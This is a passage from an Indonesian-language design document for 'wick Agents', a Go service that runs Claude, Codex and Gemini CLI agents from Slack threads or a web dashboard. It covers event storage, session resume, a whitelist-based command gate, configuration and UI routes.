| `Done` (sukses) | Replace ⚙️ → ✅. Post 1 message berisi accumulated assistant text |
| `Done` (ada blocked di tengah) | Replace ⚙️ → 🚫. Post final text + note "ada command di-block, detail di dashboard" |
| `Error` (subprocess crash, dll) | Replace ⚙️ → ❌. Post "Agent error: <ringkas>. Lihat dashboard untuk detail" |

**Reaction lifecycle**: ⏳ → ⚙️ → ✅ / 🚫 / ❌ (di message user, bukan di reply terpisah). User scroll thread = liat status tiap turn cepat dari ikon.

**Mengapa minimal**: Slack rate limit ketat (`chat.update` tier 3 = 50/min). Post per state = spam thread + risk rate limit. Reaction operations (`reactions.add`, `reactions.remove`) tier lebih longgar dan visual lebih jelas.

**Final response**: buffer accumulated `text_delta` sampai `Done`, post sekali. Kalau response > 4000 char → split per 3800 char, multiple reply dalam thread.

**On-demand dashboard link**: kalau user mau detail, ketik `dashboard` di thread → wick reply URL ke session detail page (`https://<host>/tools/agents/sessions/<thread_ts>`). Lihat §10.

**Step 5 — SSE dashboard (`stream.go`):**

Dashboard mendapat semua events real-time karena tidak ada rate limit:
- Setiap event (termasuk `text_delta` per karakter) langsung di-broadcast via SSE
- Dashboard tampilkan dua mode:

| Mode | Tampilan |
|---|---|
| **Formatted** | Conversation biasa: user turn → assistant response |
| **Raw stream** | Semua events JSON mentah: thinking, tool calls, deltas — seperti panel Output di VSCode |

**Step 6 — Simpan event (`store.go`):**

Semua state per session di filesystem `~/.wick/agents/sessions/<id>/`. No DB writes untuk agent state. Lihat §4.1 untuk format file dan §14 untuk full mapping.

| Event | Yang disimpan | Lokasi |
|---|---|---|
| Incoming user message | `{ts, role:user, source, text}` | `conversation.jsonl` (append) |
| `TextDelta` (accumulated saat `Done`) | `{ts, role:assistant, agent, text}` | `conversation.jsonl` (append) |
| `ToolUse` | `{ts, agent, cmd, status:allowed\|blocked}` | `commands.jsonl` (append) |
| `SessionID` | update `cli_session_id` field di entry agent yang sesuai | `agents.json` (atomic write) |
| Status agent berubah (idle/running/queued) | update `status` + `last_active` | `agents.json` (atomic write) |
| Status session berubah | update `status` + `last_active` | `meta.json` (atomic write) |
| `Raw` (semua events) | passthrough JSON + `ts` | `raw.jsonl` (append, optional) |

- **jsonl files**: append-only, fsync per write. Reader (UI/SSE) baca tail file.
- **json files (`meta.json`/`agents.json`)**: atomic write via tmp + rename. Read = full file load (kecil, <1KB biasanya).

**Ringkasan: apa yang perlu di-coding:**

| File | Yang dibuat |
|---|---|
| `events.go` | Interface `EventParser` + implementasi ClaudeParser, CodexParser, GeminiParser |
| `agent.go` | State machine (idle/thinking/running_tool/responding) + idle timer reset |
| `slack.go` | State → Slack message handler, buffer text, chunking >4000 char |
| `stream.go` | SSE broadcaster, fan-out ke semua dashboard clients |
| `store.go` | Append jsonl (conversation/commands/raw) + atomic write `meta.json`/`agents.json` |
| `cmd/wick-gate/main.go` | Binary kecil untuk hook, terima stdin JSON, check whitelist, exit 0/2 |

Tidak ada perubahan di `agent.md` atau file preset — semua di kode Go.

### 4.7 Transport

Transport = abstraction layer antara Agents dan sumber pesan. Tiga implementasi:

| Transport | Source | Session key | Status |
|---|---|---|---|
| **Slack** | Bot event (Socket Mode atau HTTP Event API) | `thread_ts` | Phase 5 |
| **UI** | Form submit dari `/tools/agents/sessions/{id}/send` | UUID (saat session dibuat dari UI) | Phase 4 |
| **API** | HTTP POST (future, untuk integrasi eksternal) | UUID | Out of scope MVP |

```go
type Transport interface {
    Listen(ctx context.Context, handler MessageHandler) error
    Send(ctx context.Context, msg OutgoingMessage) error
}

type IncomingMessage struct {
    SessionKey string    // routing key — thread_ts (slack) atau session UUID (ui/api)
    UserID     string    // pengirim (slack user ID atau wick user ID)
    GroupIDs   []string  // user groups si pengirim (slack only, untuk access check)
    Text       string
    Source     string    // "slack" | "ui" | "api" — masuk ke conversation.jsonl
    Raw        any       // payload original dari transport
}
```

**Mode kirim** (saat handler tulis output balik):

| Source di-set | Output channel |
|---|---|
| `slack` | Reaction lifecycle + final message di thread |
| `ui` | SSE broadcast — UI client live-update via EventSource |
| Mix (session origin slack, user kirim dari UI) | Default: SSE only. Optional toggle "mirror to Slack" per-session |

#### Implementasi Slack

- Terima message event dari Slack (Socket Mode default — tidak butuh public URL)
- Route berdasarkan `thread_ts` → session key
- Thread baru → create folder `sessions/<thread_ts>/`
- Resolve user groups (`GroupIDs`) dari Slack API untuk setiap pesan masuk — dipakai access control
- Output: reaction lifecycle + final message (lihat §4.6 step 4)

**Access Control** (Slack only):

Setiap pesan masuk di-check sebelum diproses. Config dikelola dari UI (section Slack → Access).

| Mode | Perilaku |
|---|---|
| `everyone` | Semua member workspace boleh trigger agent |
| `users` | Hanya user ID yang ada di allowed users list |
| `groups` | Hanya member dari Slack User Group yang ada di allowed groups list |

Pesan dari user yang tidak diizinkan → diabaikan (tidak di-reply, tidak di-log ke conversation).

#### Implementasi UI

UI bukan listener pasif — request-driven. Wick handler `/tools/agents/sessions/{id}/send` bertindak sebagai entry point transport:

```
POST /tools/agents/sessions/<id>/send
body: { text: "...", mode: "user" | "system" }

→ wick build IncomingMessage{SessionKey: id, Text: text, Source: "ui", UserID: <wick-user>}
→ pass ke Session Manager (sama seperti dari Slack)
→ output via SSE broadcast (semua client yang sedang buka session detail dapat update)
```

Mode:
- **user** — simulasi user message biasa, role=user, di-forward ke claude stdin
- **system** — operator instruction, role=system, claude proses sebagai system reminder

Authorization pakai session login wick (bukan Slack user ID). Lihat §9.2 untuk UI composer detail.

### 4.8 Web Dashboard

Real-time via **HTTP Streaming (SSE)** — tidak butuh WebSocket karena dashboard read-only.

```
GET /agents/stream   → text/event-stream
```

Event yang di-stream:
- `pool_state` — slot aktif, queue, status tiap session
- `session_update` — status berubah (idle → running, dll)
- `conversation` — history percakapan per session (append-only)
- `command_log` — setiap command gate event (allowed/blocked)
- `process_log` — stdout/stderr subprocess (filtered)

Halaman dashboard menampilkan:
- **Overview**: berapa agent running, queue length, total sessions
- **Session list**: per session ada status, backend, workspace, last active
- **Session detail**: conversation history + command log real-time
- **Queue**: urutan antrian, estimasi tunggu

---

## 5. Alur Lengkap

### 5.1 Pesan Masuk dari Slack

```
1. Slack event masuk (message di thread atau channel)
2. Slack Bot extract (channel_id, thread_ts, text, user)
3. Session Manager lookup `sessions/<thread_ts>/meta.json`
   - Folder tidak ada → mkdir + tulis meta.json + agents.json baru (origin=slack, status=idle)
4. Cek status session di meta.json:
   - running → teruskan input ke subprocess stdin langsung
   - idle    → masuk Agent Pool
     - Ada slot → spawn subprocess, status = running (update meta.json)
     - Pool penuh → status = queued, pesan masuk message buffer
5. Kalau status = queued dan pesan baru masuk → append ke message buffer (tidak diproses satu-satu)
6. Saat slot tersedia → spawn subprocess → kirim semua buffered messages sekaligus sebagai satu input
7. Subprocess di-spawn dengan:
   - binary: claude / codex / gemini
   - flag resume: `--resume <cli_session_id>` kalau entry agent di `agents.json` punya cli_session_id, else tanpa flag
   - output format: `--output-format stream-json` (claude) untuk capture session ID
   - working dir: `~/.wick/agents/sessions/<thread-id>/workspace/` (worktree)
   - hook config: wick-gate hook di-inject via settings sebelum spawn
8. Input ditulis ke subprocess stdin
9. Subprocess stdout di-baca per chunk → stream ke Slack + SSE dashboard. Append ke `conversation.jsonl`/`raw.jsonl`
10. Command Gate intercept setiap shell exec sebelum dieksekusi → log ke `commands.jsonl`
11. Idle timer reset setiap ada aktivitas
12. Kalau idle > TTL → subprocess.Kill(), status = idle (update agents.json + meta.json), slot dibebaskan
    → queue di-proses (session berikutnya di-spawn)
```

### 5.1.1 Message Buffer saat Queue

Kalau session masih queue, pesan tidak diproses satu-satu — di-buffer dulu, dikirim sekaligus saat agent dapat slot.

**Simulasi 5 pesan di 1 thread saat queue:**

```
Thread T123 — session masih queued (pool penuh)

[10:01] User: "clone repo frontend"
        → buffer: ["clone repo frontend"]

[10:02] User: "dan setup dependencies nya"
        → buffer: ["clone repo frontend", "dan setup dependencies nya"]

[10:03] User: "pakai yarn bukan npm"
        → buffer: ["clone repo frontend", "dan setup dependencies nya", "pakai yarn bukan npm"]

[10:04] User: "oh sama bikin branch feature/auth"
        → buffer: ["...", "bikin branch feature/auth"]

[10:05] User: "itu semua ya"
        → buffer: ["...", "itu semua ya"]

[10:06] Slot tersedia → spawn agent
        → kirim ke stdin:
          "clone repo frontend
           dan setup dependencies nya
           pakai yarn bukan npm
           oh sama bikin branch feature/auth
           itu semua ya"
        → agent baca semua sekaligus, jawab sekali
```

**Kenapa tidak satu-satu:**

| | Satu-satu | Sekaligus (buffer) |
|---|---|---|
| Agent jawab pesan 1 dulu | ✅ tapi user sudah lanjut | — |
| Agent lihat full intent user | ❌ | ✅ |
| Jumlah response ke Slack | 5× | 1× |
| User ubah intent di pesan tengah | ❌ agent tidak tahu | ✅ agent baca semua |
| Efisiensi token | ❌ boros | ✅ hemat |

Notifikasi ke Slack saat masuk queue:
```
⏳ Sedang antri, akan diproses setelah slot tersedia.
   Kamu bisa terus kirim pesan — semua akan dijawab sekaligus.
```

### 5.2 Session Revival & Context Management

Dua pendekatan untuk context continuity setelah subprocess di-kill:

| | **A: Claude Native Memory** | **B: Wick Manages History** |
|---|---|---|
| **Cara kerja** | Spawn ulang di workspace sama → claude baca `~/.claude/projects/<hash>/` sendiri | Wick inject conversation history ke stdin saat spawn |
| **Context continuity** | ✅ Natural, claude handle sendiri | ✅ Controlled, wick yang tentukan |
| **Native tools** (bash, file, dll) | ✅ Full support | ✅ Full support |
| **Skills** (slash commands) | ✅ Full support | ✅ Full support |
| **MCP bawaan claude** | ✅ Full, baca config native | ✅ Full, spawn sama |
| **Claude project memory** | ✅ Jalan natural | ⚠️ Bisa conflict dengan injected history |
| **Codex support** | ✅ Codex punya mekanisme serupa | ⚠️ Format inject beda per CLI, perlu handle masing-masing |
| **Reset conversation** | ⚠️ Harus clear `~/.claude/projects/` | ✅ Hapus jsonl, clean |
| **Tampil di dashboard** | ⚠️ Harus parse format internal claude | ✅ Wick punya copy, langsung tampil |
| **Multi-agent context sharing** | ⚠️ Shared via workspace, bisa conflict | ✅ Wick bisa kontrol apa yang di-share |
| **Implementasi** | ✅ Simple, spawn aja | ❌ Complex: inject format, truncation, edge cases |
| **Prediktabilitas** | ⚠️ Bergantung behavior internal claude | ✅ Wick yang kontrol penuh |
| **Storage** | claude manage sendiri | jsonl per session bertambah per conversation |

**Keputusan: Hybrid**

- Claude native memory tetap jalan (tidak dioverride) → context revival, tools, skills, MCP semua otomatis
- Wick **juga** simpan copy conversation ke `conversation.jsonl` → **hanya untuk dashboard display**, tidak di-inject balik ke subprocess
- Reset conversation: hapus `conversation.jsonl` + clear `~/.claude/projects/<hash>/` untuk session tersebut

### Session Management per CLI — Riset

Semua tiga CLI support resume via session ID. Wick **wajib simpan mapping `thread_id → CLI session_id`** di `agents.json` — bukan cuma rely on working directory — karena workspace bisa di-share antar thread dan tanpa ID yang tepat, resume bisa ambil sesi yang salah.

#### Storage & Resume per CLI

| | **Claude CLI** | **Codex CLI** | **Gemini CLI** |
|---|---|---|---|
| **State disimpan di** | `~/.claude/projects/<cwd-hash>/*.jsonl` | `~/.codex/history.jsonl` | `~/.gemini/tmp/<project_hash>/chats/` |
| **Format** | JSONL | JSONL | Auto-saved (format tidak didokumentasikan) |
| **Resume latest** | `--continue` / `-c` | `codex resume --last` | `--resume` |
| **Resume by ID** | `--resume <id>` / `-r` | `codex resume <UUID>` | `--resume <UUID>` |
| **Stdin inject history** | ✅ `--input-format stream-json` | ❌ tidak didokumentasikan | ❌ tidak didukung |
| **Project memory** | ✅ `CLAUDE.md` | ✅ `AGENTS.md` | ⚠️ tidak ada standar |
| **Skills / slash commands** | ✅ native | ⚠️ terbatas | ❌ tidak ada |
| **MCP support** | ✅ native | ✅ native | ⚠️ eksperimental |

#### Dua Pendekatan: Wick Manage vs CLI Native

| | **A: Wick simpan session ID di `agents.json`** | **B: Rely on CLI latest session** |
|---|---|---|
| **Cara kerja** | Wick simpan `thread_id → CLI session_id`, revival pakai `--resume <id>` | Spawn di dir yang sama, CLI ambil sesi terakhir otomatis |
| **Workspace sharing** | ✅ Aman — setiap thread punya session ID sendiri | ❌ Berbahaya — dua thread di workspace sama bisa cross-resume sesi yang salah |
| **Akurasi resume** | ✅ Selalu resume sesi yang benar | ⚠️ Hanya benar kalau 1 thread per workspace |
| **Implementasi** | Moderate — perlu ambil + simpan session ID saat subprocess start | Simple — spawn aja |
| **Claude CLI** | ✅ `--resume <id>` | ✅ `--continue` |
| **Codex CLI** | ✅ `codex resume <UUID>` | ⚠️ Ambil sesi terakhir, bisa salah |
| **Gemini CLI** | ✅ `--resume <UUID>` | ⚠️ Ambil sesi terakhir, bisa salah |
| **Fallback kalau ID tidak ada** | Inject last N turns via stdin (Claude: stream-json, lainnya: plain text) | Mulai sesi baru |

**Keputusan: Approach A** — wick simpan `thread_id → CLI session_id` di `sessions/<id>/agents.json`.

#### Flow Resume dengan Session ID

```
Pertama kali session dibuat:
  spawn subprocess (tanpa --resume)
  subprocess start → cetak session ID di awal output
  wick tangkap session ID → atomic write sessions/T123/agents.json:
    [{"name":"backend","backend":"claude","cli_session_id":"abc-456",...}]

Subprocess di-kill (TTL 2 menit):
  cli_session_id="abc-456" tetap ada di agents.json

Pesan baru masuk ke thread T123:
  wick read sessions/T123/agents.json → cli_session_id=abc-456
  spawn subprocess dengan: claude --resume abc-456
  conversation lanjut dari sesi yang tepat
```

#### Cara Wick Ambil Session ID

Setiap CLI punya cara berbeda untuk expose session ID:

| CLI | Cara ambil session ID | Detail |
|---|---|---|
| **Claude CLI** | `--output-format stream-json` | Setiap event JSON punya field `session_id`. Wick parse event pertama. |
| **Codex CLI** | Baca file terbaru di `~/.codex/sessions/YYYY/MM/DD/` | File `rollout-*.jsonl` berisi field `ID`. Wick baca setelah subprocess start. |
| **Gemini CLI** | Env var `GEMINI_SESSION_ID` | Wick baca env var dari subprocess setelah start, atau scan `~/.gemini/tmp/<hash>/chats/` untuk file terbaru. |

**Claude spawn command:**
```bash
claude --output-format stream-json --resume <session_id_if_exists>
```
Wick parse stream JSON, ambil `session_id` dari event pertama, simpan ke `sessions/<id>/agents.json`.

#### Fallback: Inject via Stdin

Kalau session ID tidak bisa di-capture atau sudah expired di sisi CLI:

| CLI | Metode inject | Format |
|---|---|---|
| Claude CLI | `--input-format stream-json` | `{"type":"user","message":{"role":"user","content":"..."}}` |
| Codex CLI | Plain stdin | Teks biasa, context terbatas |
| Gemini CLI | Tidak didukung | Mulai sesi baru, inject tidak bisa |

---

### Cara Kerja Teknis

Subprocess stdout dibaca wick dan diteruskan ke dua tempat secara independen:

```
subprocess stdout
       │
       ├──→ Wick baca chunk-by-chunk ──→ stream ke Slack
       │                               └──→ append ke conversation.jsonl (untuk dashboard)
       │
       └──→ Claude tulis ke ~/.claude/projects/<hash>/ (otomatis, internal)
```

Wick tidak inject apapun ke subprocess waktu revival. Claude yang handle sendiri via file-nya.

### Simulasi

```
T+00:00  User: "clone repo dan setup project"
         wick → tulis ke stdin subprocess
         subprocess stdout → wick tangkap → Slack reply + append conversation.jsonl

T+00:45  User: "tambah error handling di auth.go"
         subprocess stdout → wick tangkap → Slack reply + append conversation.jsonl

T+02:46  Tidak ada aktivitas 2 menit → wick kill subprocess
         Memory bebas, conversation.jsonl tetap ada

T+02:51  User: "tadi auth.go sudah kita ubah apa aja?"
         wick spawn subprocess baru, working dir sama
         Claude baca ~/.claude/projects/<hash>/ → jawab natural
         wick tangkap response → Slack reply + append conversation.jsonl
```

### Apa yang Tersimpan di Mana

| Waktu | `sessions/<id>/conversation.jsonl` | `~/.claude/projects/<hash>/` |
|---|---|---|
| T+00:00 | turn 1: user + assistant | turn 1 |
| T+00:45 | turn 1–2 | turn 1–2 |
| T+02:46 (killed) | turn 1–2, read-only di dashboard | turn 1–2, siap di-resume |
| T+02:51 (revived) | turn 1–3 (append) | turn 1–3 |
| Reset conversation | truncate `conversation.jsonl` | hapus folder `<hash>/` |

### Grafik Memory & Storage

```
Memory (MB)
200 │     ╔══════════╗              ╔══════════╗
    │     ║subprocess║              ║subprocess║
 50 │     ║  aktif   ║              ║  aktif   ║
  0 │─────╝          ╚──────────────╝          ╚────
         spawn     kill(TTL)      spawn     kill(TTL)
           ↑                        ↑
        pesan masuk              pesan masuk

conversation.jsonl (turns appended)
  6 │                                         ●──●
  4 │                     ●──●──●
  2 │     ●──●
  0 │─────────────────────────────────────────────
       turn 1-2         turn 3-4            turn 5-6
       (aktif)          (aktif)             (aktif)
         ↑                 ↑                  ↑
      tersimpan         tersimpan          tersimpan
      saat aktif        saat aktif         saat aktif
      tetap ada         tetap ada          tetap ada
      saat idle         saat idle          saat idle
```

---

## 6. Struktur Modul

```
internal/agents/               ← core engine, tidak ada UI
  storage.go                   // FS helpers: atomic write json, append jsonl, scan folder
  registry.go                  // In-memory registry (projects + sessions), boot scan, sync
  preset.go                    // Preset: CRUD, snapshot, merge ke CLAUDE.md
  project.go                   // Project: CRUD, git clone/init, worktree add/remove
  session.go                   // Session: CRUD, agents.json mgmt, switch agent
  agent.go                     // Agent struct + lifecycle (spawn, kill, idle timer)
  pool.go                      // Agent Pool: slot management + queue
  gate.go                      // Command Gate: whitelist check
  metacmd.go                   // Meta-command parser (ganti agent, pakai project, dashboard, dll)
  events.go                    // Parse raw CLI events (stream-json) → internal AgentEvent
  state.go                     // Per-agent state machine (idle/thinking/running_tool/responding)
  store.go                     // Pipeline AgentEvent → append jsonl + atomic write meta/agents.json
  transport.go                 // Transport interface + IncomingMessage struct
  slack.go                     // Slack transport: receive event, reaction lifecycle, chunked reply
  ui_transport.go              // UI transport: handler glue untuk POST /sessions/{id}/send
  stream.go                    // SSE broadcaster (dashboard real-time)
  config.go                    // Config structs + bootstrap seed

cmd/wick-gate/                 ← binary kecil dipanggil CLI hooks (PreToolUse, BeforeTool, dll)
  main.go                      // Terima tool context via stdin, check whitelist, exit 0/2

internal/tools/agents/         ← wick Tool: manager UI (lihat §9.2)
  tool.go                      // Register func + route handlers
  view.templ                   // Layout (nav kiri + content kanan) + per-page bodies
  static.go                    // //go:embed js
  js/agents.js                 // EventSource client + composer + action buttons
```

**Pembagian tanggung jawab:**

| | `internal/agents/` | `internal/tools/agents/` |
|---|---|---|
| Filesystem read/write (jsonl, json) | ✅ | — |
| In-memory registry | ✅ | — |
| Spawn/kill subprocess + pool/queue | ✅ | — |
| Slack listener + reaction lifecycle | ✅ | — |
| Event parsing (claude/codex/gemini stream-json) | ✅ | — |
| State machine + command gate | ✅ | — |
| SSE broadcaster | ✅ | — |
| Halaman UI (sessions, projects, presets, queue) | — | ✅ |
| Composer (POST /sessions/{id}/send → ke transport) | — | ✅ (handler), ✅ (transport bus) |
| Config pages (General, Slack, Workspace) | — | ✅ |
| HTTP routes `/tools/agents/...` | — | ✅ |

---

## 7. Integrasi MCP

### 7.1 Default: Pakai Config Claude/Codex yang Sudah Ada

Secara default agent di-spawn **tanpa inject config tambahan** — claude/codex CLI otomatis membaca config native mereka (`~/.claude/`, `~/.codex/`, dll). Semua MCP, skills, dan memory yang sudah dipasang user langsung tersedia tanpa konfigurasi tambahan.

```bash
# Claude CLI — pakai config bawaan, tidak ada flag tambahan
claude

# Codex CLI
codex
```

Ini intentional: kalau user sudah pasang banyak MCP di claude-nya, agent langsung dapat semua itu gratis.

### 7.2 Wick MCP & Custom MCP

Ikut config native CLI masing-masing. Kalau user mau agent bisa akses wick MCP atau MCP tambahan lainnya, daftarkan langsung di config CLI-nya:

- **Claude**: tambah di `~/.claude/claude_desktop_config.json` atau via `claude mcp add`
- **Codex**: tambah di `~/.codex/config.json`
- **Gemini**: tambah di `~/.gemini/settings.json`

Wick tidak generate atau inject config MCP — agent spawn as-is, semua MCP yang sudah terdaftar di CLI langsung tersedia.

---

## 8. Konfigurasi

Config dipecah menjadi tiga struct terpisah — masing-masing punya section sendiri di UI. Semua pakai `wick:"..."` tag, masuk ke `configs` table di DB, muncul otomatis di admin UI. Tidak ada YAML config. Default di-seed via bootstrap waktu modul pertama kali diinisialisasi (bukan hardcode di tag, karena kvlist tidak support `default=`).

### 8.1 General

```go
type GeneralConfig struct {
    Enabled        bool   `wick:"desc=Enable the Agents feature."`
    MaxConcurrent  int    `wick:"desc=Max concurrent agent subprocesses. Default: 2."`
    IdleTimeoutSec int    `wick:"desc=Seconds of inactivity before subprocess is killed. Default: 120."`
    DefaultBackend string `wick:"desc=Default CLI backend.;dropdown=claude|codex|gemini"`
    AllowedCmds    string `wick:"kvlist;desc=Allowed shell command patterns. Unlisted commands are auto-blocked."`
    PublicURL      string `wick:"url;desc=Public base URL of this wick instance. Used for the 'dashboard' Slack meta-command (e.g. https://wick.example.com)."`
}
```

Bootstrap seed untuk `AllowedCmds`:
```json
[{"value":"git *"},{"value":"ls *"},{"value":"cat *"},{"value":"mkdir *"}]
```

### 8.2 Slack

```go
type SlackConfig struct {
    Mode          string `wick:"desc=Connection mode.;dropdown=socket|http"`
    BotToken      string `wick:"secret;required;desc=Bot token (xoxb-...)."`
    AppToken      string `wick:"secret;desc=App token (xapp-...). Required for socket mode."`
    SigningSecret string `wick:"secret;desc=Signing secret. Required for http mode."`
    AccessMode    string `wick:"desc=Who can trigger agents.;dropdown=everyone|users|groups"`
    AllowedUsers  string `wick:"kvlist;desc=Allowed Slack user IDs. Active when access mode = users."`
    AllowedGroups string `wick:"kvlist;desc=Allowed Slack user group IDs (@group). Active when access mode = groups."`
}
```

**Socket Mode** (default) — persistent WebSocket ke Slack, tidak butuh public URL. Cocok untuk deployment internal/behind firewall.

**HTTP Event API** — Slack POST ke URL wick. Butuh public URL atau reverse proxy.

### 8.3 Workspace

```go
type WorkspaceConfig struct {
    BaseDir string `wick:"desc=Base directory for all agents data (projects, sessions, presets). Default: ~/.wick/agents/."`
}
```

Sub-folder `projects/`, `sessions/`, `presets/` dibikin di bawah `BaseDir` — lihat §4.1.

---

## 9. UI & Tool Manager

Agents punya menu sendiri di nav wick. Terdiri dari dua bagian:

### 9.1 Config Pages

Tiga halaman config terpisah, masing-masing punya section sendiri:
- **General** — enable/disable, pool size, idle TTL, backend, allowed commands
- **Slack** — credentials, connection mode, access control
- **Workspace** — base directory

### 9.2 Manager Tool

Halaman manager di-expose sebagai wick Tool — user bisa lihat dan kelola agent dari UI web. Implementasi ikut pola di [tool-module.md](/docs/guide/tool-module.md): satu Register func, semua route relatif ke `/tools/{key}`, view di-render via templ.

#### Layout: nav kiri + content kanan

Daftar halaman cukup banyak (Overview, Projects, Presets, Sessions, Queue, Config × 3). Kalau ditumpuk vertikal di header bakal sesak — pakai layout **dua kolom**: nav kiri (sidebar) + content kanan, mirip pattern `convert-text` dan screenshot tool-detail di tool-module.md.

```
┌──────────────────────────────────────────────────────────┐
│ /tools/agents                                            │
├────────────┬─────────────────────────────────────────────┤
│ Overview   │                                             │
│ Sessions ▸ │           Content area                      │
│ Projects   │           (per-page render)                 │
│ Presets    │                                             │
│ Queue      │                                             │
│ ─────────  │                                             │
│ General    │                                             │
│ Slack      │                                             │
│ Workspace  │                                             │
└────────────┴─────────────────────────────────────────────┘
```

**Templ structure:**

```html
<main class="mx-auto w-full max-w-container px-6 pb-8">
  <div class="mt-4 grid grid-cols-1 gap-6 md:grid-cols-[240px_1fr]">
    <aside class="rounded-xl border ...">
      <!-- nav links: highlight active page -->
    </aside>
    <section class="rounded-xl border ...">
      <!-- per-page content rendered by handler -->
    </section>
  </div>
</main>
```

Grid `md:grid-cols-[240px_1fr]` — fixed 240px sidebar, sisa untuk content. Di mobile (single col), aside collapse jadi tab strip horizontal.

#### Halaman & route

Semua route relatif ke `/tools/agents` (mount path dari `Tool.Key = "agents"`).

| Halaman | Route | Isi |
|---|---|---|
| **Overview** | `GET /` | Pool status, queue length, total sessions aktif |
| **Sessions** | `GET /sessions` | List semua session: thread ID, project, active agent, status, last active |
| **Session detail** | `GET /sessions/{id}` | Conversation + command log + composer kirim message |
| **Send message** | `POST /sessions/{id}/send` | Kirim message dari UI ke session (treat sama seperti incoming Slack) |
| **Resume agent** | `POST /sessions/{id}/agents/{name}/resume` | Spawn ulang dengan `--resume <cli_session_id>` |
| **Kill agent** | `POST /sessions/{id}/agents/{name}/kill` | Kill subprocess, status idle, cli_session_id tetap |
| **Reset agent** | `POST /sessions/{id}/agents/{name}/reset` | Hapus cli_session_id + clear claude state file |
| **Projects** | `GET /projects` | List project: nama, repo, worktrees aktif, disk usage. Create/edit/delete/git pull |
| **Presets** | `GET /presets` | List preset: nama, preview agent.md. Create/edit/delete |
| **Queue** | `GET /queue` | Urutan antrian, agent mana yang nunggu slot |
| **SSE stream** | `GET /stream` | Real-time event stream untuk dashboard (`text/event-stream`) |

Mutasi (create/edit/delete project/preset, reset session, kill agent, send message) → `POST` ke route, redirect balik via `c.Redirect(c.Base()+"/sessions/<id>", 303)`.

#### Listing pages (Sessions, Projects)

Listing = scan folder, bukan SQL.

| Page | Operasi |
|---|---|
| **Sessions** | `readdir sessions/`, baca `meta.json` tiap folder, sort by `last_active` |
| **Projects** | `readdir projects/`, baca `meta.json` tiap folder |
| **Filter sessions by project** | scan + filter in-app (`meta.json.project == X`) |
| **Lookup session detail** | path direct: `sessions/<id>/meta.json` + `agents.json` |

Estimasi performa di local SSD: <500 session listing = <30 ms. Skala besar (>5000) butuh cache layer atau sidebar pagination — out of scope MVP.

#### Conversation display

Source data: file jsonl di `~/.wick/agents/sessions/<id>/` — bukan parse claude jsonl, bukan DB query.

| Tab | File | Isi |
|---|---|---|
| **Conversation** | `conversation.jsonl` | user/assistant turn (clean) |
| **Commands** | `commands.jsonl` | tool call + status allowed/blocked |
| **Raw stream** | `raw.jsonl` | thinking/tool_use/deltas mentah (debug view) |

Pagination: load 50 line terakhir default, tombol "load older" → seek mundur dari offset terakhir. Live append via SSE saat session aktif. Read-only — UI tidak edit history.

#### Session detail actions

Per-agent ada tombol kontrol di session detail page:

| Tombol | Aksi | Catatan |
|---|---|---|
| **▶ Resume** | POST `/sessions/{id}/agents/{name}/resume` | Spawn `claude --resume <cli_session_id>` di cwd worktree. Disabled kalau status running |
| **🛑 Kill** | POST `.../kill` | `subprocess.Kill()`, status idle. cli_session_id tetap → masih bisa resume |
| **🗑 Reset** | POST `.../reset` | DELETE cli_session_id + clear `~/.claude/projects/<hash>/` |
| **📋 Copy command** | client-side | Copy command resume yang setara untuk dijalan manual di terminal |

Format **Copy command** per backend (untuk paste manual):
```bash
cd ~/.wick/agents/sessions/<thread-id>/workspace
claude --resume <cli_session_id>            # Claude
codex resume <cli_session_id>               # Codex
gemini --resume <cli_session_id>            # Gemini
```

Edge case:

| Skenario | Behavior |
|---|---|
| `cli_session_id` NULL | Resume → spawn sesi baru tanpa flag |
| Sesi expired di sisi CLI | Resume → fallback inject stdin (Claude only, lihat §5.2) |
| Pool penuh saat resume | Status = queued, sama dengan flow normal |

#### Send message dari UI

Composer di session detail page (pattern lihat ASCII layout di chat decision):

```
POST /sessions/{id}/send
body: { text: "...", mode: "user" | "system" }
```

Mode:
- **user**: simulasi user message biasa, masuk `conversation.jsonl` source=ui
- **system**: instruction operator, role=system, tampil beda di UI, claude proses sebagai system reminder

Default tidak forward ke Slack thread (biar tidak muncul tiba-tiba di channel). Konfigurable per-session toggle "mirror to Slack" kalau perlu.

#### Active nav highlight

Handler set active key sebelum render:

```go
func sessions(c *tool.Ctx) {
    c.HTML(Layout(c.Base(), "sessions", SessionsBody(...)))
}
```

`Layout(base, active, body)` render shell + sidebar dengan active item ter-highlight (border green, bg green-200/40 — sama spec design system).

#### Real-time

`GET /stream` → SSE. Halaman session detail (dan overview) connect ke endpoint ini via vanilla JS `EventSource`. Tiap event (`pool_state`, `session_update`, `conversation`, `command_log`) di-handle ke DOM update sesuai halaman aktif. Tidak ada framework — ikut konvensi tool-scoped JS (`js/agents.js`).

---

## 10. Meta-Commands

Pesan dari Slack yang di-intercept wick sebelum masuk ke subprocess. Case-insensitive, support bahasa Indonesia dan Inggris.

| Command | Contoh | Aksi |
|---|---|---|
| **Agent** | | |
| Ganti agent | `ganti agent backend` / `switch to reviewer` | Set active agent, spawn kalau belum ada |
| Ganti agent + reset | `ganti agent backend reset` | Switch + clear conversation history |
| List agents | `list agents` / `agent apa aja` | Reply list agent + preset dalam session ini |
| Stop agent | `stop agent backend` | Kill subprocess agent, status idle |
| **Project** | | |
| Buat project | `buat project frontend` | Create project baru tanpa repo |
| Buat project + clone | `buat project frontend https://github.com/...` | Create + git clone |
| Pakai project | `pakai project frontend` | Attach session ke project, buat worktree |
| Ganti project | `ganti project api` | Switch session ke project lain |
| List project | `list project` | Reply list semua project |
| **Session** | | |
| Reset | `reset` / `mulai ulang` | Clear conversation + kill subprocess, snapshot preset diperbarui |
| Status | `status` / `agent status` | Reply status pool, slot tersedia, queue position |
| Dashboard link | `dashboard` / `link` / `dimana sesi` | Reply URL ke session detail (`https://<host>/tools/agents/sessions/<thread_ts>`) |
| Command log | `log` / `commands` | Snippet 5 command terakhir + dashboard link |

Kalau tidak match meta-command → forward ke active agent subprocess.

**`dashboard` requirement**: butuh `PublicURL` di `GeneralConfig` (lihat §8.1). Kalau belum di-set, wick reply: `Set "Public URL" di settings dulu`.

---

## 11. DB Schema

**No agent-specific tables.** Semua state agents disimpan di filesystem `~/.wick/agents/` — lihat §4.1 dan §14.

Yang **tidak** dibikin sebagai tabel DB:
- ~~`agent_projects`~~ → folder `projects/<nama>/` + `meta.json`
- ~~`agent_sessions`~~ → folder `sessions/<id>/` + `meta.json`
- ~~`session_agents`~~ → `sessions/<id>/agents.json`
- ~~`agent_conversations`~~ → `sessions/<id>/conversation.jsonl`
- ~~`agent_command_logs`~~ → `sessions/<id>/commands.jsonl`
